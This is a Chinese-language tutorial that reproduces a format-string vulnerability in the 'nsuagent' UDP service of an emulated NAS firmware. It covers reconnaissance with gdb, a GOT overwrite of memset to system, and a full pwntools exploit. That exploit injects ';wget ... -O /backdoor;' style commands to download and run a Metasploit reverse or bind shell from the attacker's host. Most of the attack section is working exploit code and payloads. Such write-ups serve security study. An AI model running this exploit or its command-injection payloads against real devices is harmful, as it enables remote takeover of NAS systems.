> + 本篇文章我们会基于前面模拟的环境来复现该漏洞。
> + 前置知识：
>     - [PWN入门（2-1-6）-格式化字符串漏洞-hijack GOT](https://www.yuque.com/cyberangel/rg9gdm/xezt9x)
>     - [PWN进阶（1-8）-ret2dlresolve(1)（高级ROP）](https://www.yuque.com/cyberangel/rg9gdm/oyne1i)【了解got与plt】
> + 附件：链接: [https://pan.baidu.com/s/1IkFKidiMqy8EpXayZntvaQ](https://pan.baidu.com/s/1IkFKidiMqy8EpXayZntvaQ) 提取码: bz8d
> + 本文首发于IOTsec-Zone
>

# 1、启动模拟环境
当你关闭qemu后若想要重新启动模拟环境就需要依次执行下面的所有命令：

```bash
# Ubuntu虚拟机--------------------------------------------------------------------------------
$ sudo tunctl -t tap0
$ sudo ifconfig tap0 192.168.5.2/24
$ sudo qemu-system-arm -M vexpress-a9 -kernel vmlinuz-3.2.0-4-vexpress \
  -initrd initrd.img-3.2.0-4-vexpress \
  -drive if=sd,file=debian_wheezy_armhf_standard.qcow2 \
  -append "root=/dev/mmcblk0p2" -smp 2,cores=2 \
  -net nic -net tap,ifname=tap0,script=no,downscript=no -nographic
# qemu----------------------------------------------------------------------------------------
$ ifconfig eth0 down									# 重启qemu之后网卡名称会重新变回eth0
$ ip link set eth0 name egiga0
$ ifconfig egiga0 up
$ ifconfig egiga0 192.168.5.1/24
$ mount -o bind /dev ./rootfs/dev && mount -t proc /proc ./rootfs/proc
$ mount -vt sysfs sysfs ./rootfs/sys
$ chroot ./rootfs sh
$ nsuagent
# 新建终端--------------------------------------------------------------------------------------
$ scp ./gdbserver-armel-static-8.0.1 root@192.168.5.1:/root/rootfs/
$ ssh root@192.168.5.1
$ chroot ./rootfs sh
$ chmod +x ./gdbserver-armel-static-8.0.1 
```

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1669341661983-be0e8974-f3e8-40c6-8037-6ab1206eb8ba.png)

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1669341913604-025bd34d-30e6-4459-95bd-bb97733f8d5e.png)

# 2、开始pwn
## ①、收集信息
由于Crossover在运行Windows软件时开销过大，所以本篇文章中我们大多数时候使用pwndbg取代IDA的动态调试功能、使用python的pwntools库实现UDP流量包的重放。

> + 注：wireshark软件本身不支持重放。
>

使用wireshark打开上一节中抓取的流量包，查看发送含有我们账号密码的认证数据包：

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1669595005821-74058693-addf-4508-90a7-19caa374f87b.png)

将上面的所有的16进制复制下来，使用pwntools进行重放UDP，所以我们有如下代码：

```python
from pwn import *
from threading import Thread

context.log_level="debug"
def accept():
    l=listen(50127, typ='udp')	# 监听本地（Ubuntu）的50127端口
    l.wait_for_connection()
    print(l.recv(100))			# 接收100字节应该够了
    l.close()


thread = Thread(target=accept)
thread.start()


p=remote('192.168.5.1', 50127, typ='udp')
data=bytes.fromhex(
    "00420241001c42af5b3a004f525400123456555345524e414d453a6379626572616e67656c0950415353574f52443a6379626572616e67656c0953484152455f5245513a30094654505f5245513a30")
p.send(data)
p.close()
```

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1669595291426-dcfdde8d-961c-42b7-b56e-44e430e4aeee.png)

嗯，看起来挺成功。现在就按照常见的pwn流程来吧，首先检查可执行文件的保护：

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1669596109311-017bf9f9-6f66-4fbe-b352-fdb15c5aaccd.png)

+ `No RELRO`：GOT、PLT完全没有任何保护（详情可参照：[PWN进阶（1-8）-ret2dlresolve(1)（高级ROP）](https://www.yuque.com/cyberangel/rg9gdm/oyne1i)）。
+ `No canary found`：没有canary保护。
+ `NX enabled`：栈不可执行。
+ `No PIE`：虽然程序没有开启PIE保护，但这并不意味着加载的动态链接库和其栈地址一定不变，因为我们并不知道实机上ASLR的保护等级（如下图所示），这里需要按照可变地址来考虑...

![来自：https://www.yuque.com/hideandseek1231/fcr95d/qubx1x](https://cdn.nlark.com/yuque/0/2022/png/574026/1669596867170-2ee5679f-d4bc-47a8-a2a0-6e59bb269579.png)

## ②、寻找调用链
对存在漏洞的`sub_14C60`函数交叉引用发现有许多函数调用了它：

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1669597303703-2cb2ce70-cad7-44af-a7cf-2815b74ccaed.png)

我们并不清楚调用链，但是可以通过gdb获取：

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1669597697532-7cafbf02-a24b-4584-b7b1-8fb5c4638c2a.png)

gdb-client连接上后会自动断在`recvfrom`函数：

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1669598547996-ed244c26-a00b-49ff-843c-2d90cecde63a.png)

对地址`0x14C60`下断点，run后再次执行我们的`exp1.py`：

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1669598655041-4baaa481-95cb-4817-a40c-5f92f946e5a0.png)

不知道是不是由于gdbserver的原因，很不幸的是我们无法通过`bt`或`frame`知道函数的调用过程，提示错误`corrupt stack`；但仍旧可以通过`寄存器R14（LR）`知道调用该函数的父函数：

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1669598812498-71348508-2887-4716-9d42-8630898cda0f.png)

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1669598904176-8146d069-d554-48cc-8e10-0b62aec8a1f4.png)

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1669599047263-d0c5776e-342a-441e-97a5-d8a0210c9997.png)

因此调用链为：`main_function(sub_123EC) -> sub_1AEE4 -> sub_14C60(vuln_fucntion)`。大致的看一下发现`sub_1AEE4`有多达5处调用了`sub_14C60`：

```c
void __fastcall __noreturn sub_1AEE4(int a1)
{
  // ...
  v31 = &unk_34D48;
  sub_159F8(a1, 0);
  sub_14C60(a1, "[%s][%d] Start with m_bIsWirelessEnabled = %d\n", "Run", 1320, *(unsigned __int8 *)(a1 + 32));
  sub_15474(a1);
  std::operator+<char>((int)v32, "|dstart|NDU Agent started: ");
  while ( 1 )
  {
    while ( 1 )
    {
      while ( 1 )
      {
        while ( 1 )
        {
          while ( 1 )
          {
            addr_len = 16;
            recvfrom(*(_DWORD *)(a1 + 300), buf, 0x10D8u, 0, &addr, &addr_len);
            v2 = sub_1BC48(buf, v40);
            v3 = inet_ntoa(*(struct in_addr *)&addr.sa_data[2]);
            sub_14C60(a1, "[%s][%d] GOT YOU!!!!!!, pcode = %d, ip address: %s\n", "Run", 1342, v2, v3);// sub_1AEE4 -> sub_14C60
            // ...
          }
          v4 = v2 == 2;
          if ( v2 != 2 )
            v4 = v2 == 4;
          if ( !v4 )
            break;
          if ( dword_34E9C )
          {
            v5 = std::operator<<<std::char_traits<char>>(&std::cout, "response packet. escape");
            std::endl<char,std::char_traits<char>>(v5);
          }
        }
            // ...
        }
          // ...
      }
        // ...
    }
    // ...
    sub_14C60(
      a1,
      "AuthMac: %X:%X:%X:%X:%X:%X\n",
      (unsigned __int8)v41,
      BYTE1(v41),
      BYTE2(v41),
      HIBYTE(v41),
      (unsigned __int8)v42,
      HIBYTE(v42));
    sub_14C60(a1, "LocalMac1: %X:%X:%X:%X:%X:%X\n", v16, v17, v18, v19, v20, v21);
    if ( sub_157CC(a1, &v41) )
      break;
LABEL_51:
    std::string::~string((std::string *)&v33);
    sub_1F224(v46);
  }
  sub_1F4C4(&v34, v46);
  sub_1F4DC(&v35, v46);
  sub_14C60(a1, "username: %s, password: %s\n", v34, v35);
  // ...
}
```

根据上面的代码框，我们知道程序在启动完毕之后会阻塞在`recvfrom`函数直到用户向程序发送了数据，在接收到输入之后会根据相应的判断语句进行处理。根据程序的行为知道处理完成之后它并不会退出，而是阻塞在`recvfrom`继续等待接收下一次用户的输入。`sub_14C60`在解析用户可控的`username`与`password`前的debug数据如下，这两者均存在于堆上：

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1669600771812-b37defcb-889a-4779-9212-69ef134417e2.png)

## ③、思路整理
将上面的exp稍微的进行修改以方便更换我们的payload：

```python
from pwn import *
from threading import Thread

context.log_level="debug"
def accept():
    l=listen(50127, typ='udp')	# 监听本地（Ubuntu）的50127端口
    l.wait_for_connection()
    print(l.recv(100))			# 接收100字节应该够了
    l.close()


thread = Thread(target=accept)
thread.start()


p=remote('192.168.5.1', 50127, typ='udp')
payload_username = b"cyberangel"
payload_password = b"bbbb"+b".%p"*50			# payload
encode_username = payload_username.hex()
encode_password = payload_password.hex()
data=bytes.fromhex(
    f"00420241001c42af5b3a004f525400123456555345524e414d453a{encode_username}0950415353574f52443a{encode_password}0953484152455f5245513a30094654505f5245513a30")
p.send(data)
p.close()
```

回过头来仔细研究`sub_14C60`，发现它会将执行日志输出到文件`/tmp/nsu_process`中，并且该日志永远不会删除：

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1669606290140-6aa6337f-9d96-419a-b2d9-07a426b3b505.png)

执行一次`exp2.py`后可以有如下日志，

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1669605289357-a86237ed-2e76-438c-90e2-2f781c4eddf8.png)

但是程序对输入的payload（password）有32字节长度限制，导致泄露的地址并不完整...

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1669612862423-45b0bb55-cc6b-4e12-a6ed-d566d550e780.png)

仔细想想，就算泄露出来的地址是完整的又怎样？因为我们并不能**在程序回显时拿到任何有效信息**：

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1669684873905-5771c21f-e7dc-4873-8bf7-f2a0c888edb1.png)

这就意味着所有leak地址的思路都已经被堵死，并且程序还开启了NX保护，无法在stack上构造自己的ROP链；那就只能利用程序里面现有的已知数据构造利用链了。从程序保护方面来讲，`nsuagent`最大的弱点在没有开启RELRO保护，所以获取我们可以从这里下手：

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1669596666718-6afae6aa-92bf-43db-97ec-9638187528d3.png)

利用方式有两种：

1. 是利用ret2dlresolve去修改处于可写状态的`.dynamic`节的`DT_STRTAB`的`d_ptr`指针，这就要求我们需要在栈上伪造一个`ELF String Table（.dynstr section）`，并篡改相应的结构指针，这样在动态链接的时候就会将该符号解析为system函数。（利用手法详见：[PWN进阶（1-8）-ret2dlresolve(1)（高级ROP）](https://www.yuque.com/cyberangel/rg9gdm/oyne1i#Kga4K)）
2. 因为.got.plt（俗称got表）可写，那我们就直接篡改got表为某个函数的地址并正常调用被篡改的函数即可。

emmm，相比较而言还是第二种方法比较简单，那就用它吧。具体实施之前我们还是来看一个简单的例子：

```c
#include<stdio.h>
void backdoor(char* str){
	system(str);
}
int main(){
	puts("/bin/sh");
	return 0;
}
/*
[*] '/home/cyberangel/Desktop/test1'
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
*/
```

启动gdb断到main函数，将puts的got表手动改为system的plt：`set *0x600958=0x400410`

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1669688176426-aa734134-32a6-4799-83e6-34974103cc56.png)

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1669688225324-b1e4e49a-4241-4b89-82cc-eca324aa9696.png)

continue后会执行`system("/bin/sh")`：

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1669688537084-16615508-3da9-4616-84c0-e175bf9ec159.png)

这样做似乎无法维持一个稳定的shell，执行一条命令就退出了，不知道是不是我的问题；当然了，就算存在这个问题但对于nsuagent并不影响，因为只要程序不崩溃就会一直可以接收用户的输入，从而实现多次命令执行的效果。还要说明一点的是注意arm与x86在`.got.plt`的区别，nsuagen的`.got`就是x86的`.got.plt`：

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1669688795898-5dfac506-9cbc-42b4-bc98-b6cd3ff5ed47.png)

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1669688850018-8cc2ec79-7a59-4c70-bdad-5ed07b5aaeb0.png)

不知道是不是因为libc版本过低的问题：

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1669689152563-6096f815-d30c-4d62-9daa-9b43ef5c7810.png)

> + 在我印象里好像只有got表被篡改为某个函数的真实地址，并没有见过got还能被篡改为plt的这种方法，可能是我失忆了？？？
>

## ④、构造利用链
好了，到现在我们整理一下思路，因为got表是可写的，所以我们可以劫持某个函数的got表为system以达到命令执行的效果（Linux延迟绑定技术）。那我们究竟篡改哪一个函数呢？注意到漏洞点有一个`memset`：

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1669689656885-704988cf-6bd0-462f-9f72-2b8a88cf0b99.png)

根据栈帧平衡原理再结合`sub_1AEE4`的汇编代码我们可以知道**每次**调用`sub_14C60`时memset初始化s变量的栈空间完全相同（空间的起始地址与结束地址相同），可以下个断点来看看（`b *0x14C7C`）：

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1669690143614-d21cb7c2-01ed-4bad-87ca-fb6d50a397e8.png)

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1669690155894-d3ed6227-9284-4be2-8557-e75d9f091bab.png)

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1669690164277-982c4939-fb98-4b81-90ad-9aa4a3a52b5a.png)

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1669690183731-c28094c0-9023-4258-ab28-7a3ffb75da98.png)

虽然将memset篡改为system会导致无法清空栈空间，但是好在每一次调用函数时影响的都是同一片内存区域，并不影响程序的正常运行；而且还有一个好处就是我们可以多次的主动调用memset函数。

> + system调用失败后并不会让程序崩溃
>

首先测量格式化字符串的偏移，在gdb调试时断点下在`sub_14C60`调用`fprintf`之前（`b *0x14CE0`）：

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1669707460032-b4ba2387-7e8c-4561-bdc4-c944c875bcc2.png)

再次调试并发送前面的`exp2.py`：

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1669707669927-645f88ec-e1da-40e8-b6e4-1e098d50ff5d.png)

如上图所示，R1存放着被截断之后的格式化字符串，但是我们可以仍旧在栈上找到残留的完整字符串：

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1669707887409-981573ba-65a6-4621-9985-792a34bdffae.png)

我们截取该段字符串从USERNAME开始使用，其起始地址为`0x7e8d49b2`：

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1669708031841-957cb8f2-04c8-4cb6-aa76-6da2147e9dd0.png)

接下来强制将R1寄存器改为该地址：`set $r1=0x7e8d49b2`，运行后可以得到如下结果：

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1669708207985-577e5a93-e736-4795-85d3-f2b030c44afa.png)

整理可以得到偏移为39：

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1669708701032-5ff7b28a-8728-4d33-b424-42a882d53ea7.png)

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1669708788515-5cd3629d-a5b0-49e0-bbd0-06e4928d535d.png)

然后开始使用`格式化字符串$n`更改`memset`的got表，首先是：`payload_password = b"bbbb"+b"%73904c%39$n"`

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1669709275141-ba4fbc37-bcfa-47f5-a5c0-520a041c95d8.png)

发现程序会崩溃：

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1669710841854-276f3993-ac6a-4ab1-87d7-c49d9d0f5383.png)

这也很正常，payload中`%73904c%39$n`本身的含义就是“打印73904个字节，然后将打印的字节数目作为值写入距离格式化字符串偏移为39的栈上指针**<font style="color:#E8323C;">指向</font>**的区域。从上图来看向非法地址**bbbb**写入的不是system的plt而是`_cxa_pure_virtual`：

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1669712075770-e3feb687-5ed9-4647-987d-6c102ff73ef6.png)

> 1. `0x120D4 - 0x120b0 == 0x24（36）`
> 2. `73904 - 36 == 73868`
>

稍微修改一下payload：`payload_password = p32(memset_got)+b"%73868c%39$n"【memset_got = 0x34BE4】`，要将地址减去36的原因在于进入漏洞函数时会进行如下拼接：

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1669857141609-2b94a903-a4ac-4430-9a17-4c9c8c69a5ba.png)

也就是在执行fprintf时其参数格式化字符串为：`username: cyberangel, password: addr%73868c%39$n`，从该字符串开头到格式化字符串的位置一共36字节，fprintf会直接将这36字节的字符直接输出，再结合上面的内容故需要减36：

![addr表示p32(memset_got)](https://cdn.nlark.com/yuque/0/2022/png/574026/1669857379186-9c711407-781f-4c0c-9afc-b431de747a36.png)

执行后发现我们输入的payload会发生"\x00"截断：

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1669774666622-c5504048-3fdf-4e0f-8d6d-1538ec6351a5.png)

我们后面输入的格式化字符串没有了！gdb后得知程序在解析密码时发生了截断，如下图所示，其中v46保存了我们所有发送数据的buffer：

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1669775849869-78de9140-d63d-4779-9889-4dcc5c7347dc.png)

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1669775992475-c94c75a0-311d-4a76-a6aa-a5e62a244b16.png)

经过`sub_1F4DC`的`std::string::string`后：

```c
void __fastcall sub_1F4DC(std::string *a1, int a2)
{
  std::string::string(a1, (const std::string *)(a2 + 24));
}
```

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1669776161137-154e8bcc-19f0-4190-ada7-2df9f8ffb856.png)

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1669776201703-8e2f3460-3e5f-4bf9-b45c-ba0faaa574df.png)

真好，被截的什么都不剩...稍微调整一下`p32(memset_got)`的位置，有：`payload_password = b'bbbb'+b"%73868c%43$n"+p32(memset_got)`

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1669776376429-4cda800a-cdfa-4d66-abc8-444b7b6fe7d7.png)

嘿嘿，这下应该没问题了吧？

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1669776547684-18bb545b-5096-40a7-a744-c809c4510b9d.png)

艹，哪儿来的0x0a（'\n'）？我找了半天才发现是格式化是自带的...

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1669776585783-a14c648e-0caa-46dd-8d97-e85b9cdb6e2d.png)

绝，那就不能使用经过`vsnprintf`拼接后的字符串了。但是我们注意到，`recvfrom`接收用户输入之后会将数据保留到栈上，它是未经修改，原汁原味的数据，如下图所示（`b *0x14CE0`）：

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1669794145791-75788566-0b9e-49c9-8f32-29f6943fa9e8.png)

重复上面寻找偏移的步骤，有如下`exp3.py`：

```python
from pwn import *
from threading import Thread
context.log_level="debug"
context.arch="arm"
context.endian="little"
def accept():
    l=listen(50127, typ='udp')	# 监听本地（Ubuntu）的50127端口
    l.wait_for_connection()
    print(l.recv(100))			# 接收100字节应该够了
    l.close()


thread = Thread(target=accept)
thread.start()  

memset_got=0x34BE4
p=remote('192.168.5.1', 50127, typ='udp')
payload_username = b"cyberangel"
payload_password = b'bbbb'+b"%73868c%347$n"+p32(memset_got)		# b'bbbb'+b"%73868c%43$n"+p32(memset_got)
encode_username = payload_username.hex()
encode_password = payload_password.hex()
data=bytes.fromhex(
    f"00420241001c42af5b3a004f525400123456555345524e414d453a{encode_username}0950415353574f52443a{encode_password}0953484152455f5245513a30094654505f5245513a30")
p.send(data)
p.close()
```

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1669794654943-13242f1c-2143-4066-99ff-a10e7e29decd.png)

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1669794679556-1e1e6705-b5c2-485a-9406-028cf440a674.png)

可以看到成功命令执行。现在memset已经被成功改为了system了，最后完善一下就可以了。因为该NAS有wget，所以我们先修复一下软链接：

```python
/ # rm ./usr/sbin/wget 
/ # ln -s /bin/busybox /usr/sbin/wget
/ # wget
BusyBox v1.19.4 (2021-04-01 09:56:40 CST) multi-call binary.

Usage: wget [-c|--continue] [-s|--spider] [-q|--quiet] [-O|--output-document FILE]
	[--header 'header: value'] [-Y|--proxy on/off] [-P DIR]
	[--no-check-certificate] [-U|--user-agent AGENT] [-T SEC] URL...

/ # 
```

使用kali生成msf反向shell，注意这里的LHOST为虚拟机的IP而不是qemu的IP：

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1669797135238-6af0ab12-2da3-4253-924c-0dc3b37961df.png)

使用python在msf目录下启动http服务：

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1669797254370-f1935361-4a3c-481f-9598-555a7a64a5c7.png)

完整exp如下：

```python
from pwn import *
from threading import Thread
context.log_level="debug"
context.arch="arm"
context.endian="little"
def accept():
    l=listen(50127, typ='udp')	# 监听本地（Ubuntu）的50127端口
    l.wait_for_connection()
    print(l.recv(100))			# 接收100字节应该够了
    l.close()


thread = Thread(target=accept)
thread.start()  

memset_got=0x34BE4
p=remote('192.168.5.1', 50127, typ='udp')
payload1_username = b"cyberangel"
payload1_password = b'bbbb'+b"%73868c%347$n"+p32(memset_got)
encode1_username = payload1_username.hex()
encode1_password = payload1_password.hex()
data1=bytes.fromhex(
    f"00420241001c42af5b3a004f525400123456555345524e414d453a{encode1_username}0950415353574f52443a{encode1_password}0953484152455f5245513a30094654505f5245513a30")
p.send(data1)

payload2_username = b";wget http://192.168.5.2:8080/msf-arm -O /backdoor;"	# 下载backdoor
payload2_password = b"cyberangel"
encode2_username = payload2_username.hex()
encode2_password = payload2_password.hex()
data2=bytes.fromhex(
    f"00420241001c42af5b3a004f525400123456555345524e414d453a{encode2_username}0950415353574f52443a{encode2_password}0953484152455f5245513a30094654505f5245513a30")
p.send(data2)

payload3_username = b";chmod +x /backdoor;"		# 授予可执行权限
payload3_password = b"cyberangel"
encode3_username = payload3_username.hex()
encode3_password = payload3_password.hex()
data3=bytes.fromhex(
    f"00420241001c42af5b3a004f525400123456555345524e414d453a{encode3_username}0950415353574f52443a{encode3_password}0953484152455f5245513a30094654505f5245513a30")
p.send(data3)

payload4_username = b";/backdoor;"				# 执行backdoor
payload4_password = b"cyberangel"
encode4_username = payload4_username.hex()
encode4_password = payload4_password.hex()
data4=bytes.fromhex(
    f"00420241001c42af5b3a004f525400123456555345524e414d453a{encode4_username}0950415353574f52443a{encode4_password}0953484152455f5245513a30094654505f5245513a30")
p.send(data4)

p.close()
```

先在虚拟机上监听：

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1669797404350-c3d7b8d1-259b-43d8-9dcc-d75ecc71da35.png)

正向shell的生成步骤如下（默认向外映射端口为4444），exp稍微变动一下msf文件名称就行：

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1669797869709-fc6a0dc5-984d-416b-8422-c25d64762094.png)

```python
from pwn import *
from threading import Thread
context.log_level="debug"
context.arch="arm"
context.endian="little"
# （和exp4.py一样）...
payload2_username = b";wget http://192.168.5.2:8080/back -O /back;"
# 略...

p.close()
```

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1669799439243-4f1e09ff-cc98-40fd-a579-49b0ce20e034.png)

> 注意：关于backdoor文件的命名注意简短，否则可能会出现wget文件之后落地文件的命名不正确，比如`msf-arm-positive`落地后文件名称变为了`b,`：
>
> + `payload2_username = b";wget http://192.168.5.2:8080/msf-arm-positive -O /back;"`
>
> ![](https://cdn.nlark.com/yuque/0/2022/png/574026/1669799599787-0a9ef07a-a512-4f21-b3a7-a383aa37506f.png)
>

# 3、总结
在实际利用的过程中我遇到了以下难题：

1. 复现前我已经将格式化字符串漏洞的所有知识忘得一干二净，偏移都忘了怎么找了...
2. 不知道（忘了）可以修改got表为plt。
3. `std::string::string`会发生\x00截断。
4. "\n"的添加导致格式化时目标地址错误，让我不得不寻找额外的思路去解决。

如果不想安裝pwntools的话也可以使用python自带的库实现：

```python
from threading import Thread
import socket

def accept():
    l=socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    l.bind(('', 50127))  # 监听本地（Ubuntu）的50127端口
    print(l.recvfrom(100))  # 接收100字节应该够了
    l.close()


thread=Thread(target=accept)
thread.start()

s=socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.connect(("192.168.5.1", 50127))
data=bytes.fromhex(
    "00420241001c42af5b3a004f525400123456555345524e414d453a6379626572616e67656c0950415353574f52443a6379626572616e67656c0953484152455f5245513a30094654505f5245513a30")
s.send(data)
s.close()
```



